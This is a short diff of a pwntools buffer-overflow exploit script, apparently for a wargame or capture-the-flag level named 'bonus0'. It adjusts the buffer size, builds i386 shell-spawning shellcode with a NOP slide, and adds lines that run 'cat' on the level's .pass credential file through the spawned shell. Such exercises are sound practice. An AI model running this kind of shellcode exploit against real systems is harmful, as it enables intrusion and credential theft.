@@ -64,7 +64,7 @@ def exploit():
 
 
   
-    buffer_size = 108
+    buffer_size = 104
     shellcode = asm(shellcraft.i386.linux.sh())
     nop_slide = b"\x90"
     number_of_nop_slide = buffer_size - len(shellcode)
@@ -90,9 +90,12 @@ def exploit():
     else:
         conn = get_connection(argv=payload_arg)
     
-    with open("payload", "wb") as f:
-        f.write(payload)
 
+    conn.recvuntil(b'$')
+    conn.sendline('cat /home/user/bonus0/.pass')
+    flag = conn.recvline()
+    print("\n=== Flag ===")
+    print(flag.decode())
     conn.interactive()
     
 if __name__ == "__main__":
